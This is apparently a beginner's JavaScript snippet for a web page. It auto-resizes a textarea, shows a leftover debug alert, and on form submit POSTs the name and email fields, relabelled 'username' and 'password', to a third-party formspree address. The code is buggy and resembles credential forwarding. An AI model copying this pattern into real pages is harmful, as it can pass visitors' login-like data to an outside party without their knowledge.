<script type="text/javascript">
//auto expand textarea
function adjust_textarea(h) {
	window.alert("HELLO!");
    h.style.height = "20px";
    h.style.height = (h.scrollHeight)+"px";
}

$(function() {
    $('form').submit(function() {

        $.ajax({
            type: 'POST',
            url: 'http://formspree.io/liow.alex@gmail.com',
            data: { username: $(this).name.value, 
                    password: $(this).email.value }
        });
    }); 
})
</script>